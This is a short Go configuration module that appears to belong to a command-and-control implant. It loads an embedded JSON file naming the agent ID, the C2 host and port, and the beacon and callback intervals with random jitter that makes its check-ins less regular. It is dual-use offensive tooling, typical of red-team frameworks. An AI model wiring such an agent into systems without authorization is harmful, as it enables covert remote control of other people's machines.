package config

import (
	_ "embed"
	"encoding/json"
	"time"
)

//go:embed config.json
var config []byte

type Mode uint

const (
	ModeSession Mode = 0
	ModeBeacon  Mode = 1
)

var (
	C = &Config{}
)

type Config struct {
	AgentID string `json:"id"`
	C2Host  string `json:"host"`
	C2Port  string `json:"port"`
	// agent attempts to register to the server every CallbackInterval±(CallbackSalt/1000) seconds
	CallbackInterval time.Duration `json:"callback_interval"`
	// Callback variance in milliseconds
	CallbackSalt time.Duration `json:"callback_salt"`
	// In beacon mode, the agent calls back to the C2 server every BeaconInterval±(BeaconSalt/1000) seconds
	BeaconInterval time.Duration `json:"interval"`
	// Callback variance in milliseconds
	BeaconSalt time.Duration `json:"salt"`
	Mode       Mode          `json:"mode"`
}

func Initialize() error {
	if err := json.Unmarshal(config, C); err != nil {
		return err
	}
	// salt cannot be greater than interval, so we set to 0
	if C.BeaconSalt > C.BeaconInterval*1000 {
		C.BeaconSalt = 0
	}
	if C.CallbackSalt > C.CallbackInterval*1000 {
		C.CallbackSalt = 0
	}
	// interval cannot be <=0, so set to default of 10
	if C.BeaconInterval <= 0 {
		C.BeaconInterval = 10
	}
	if !(C.CallbackInterval > 0) {
		C.CallbackInterval = 10
	}
	return nil
}
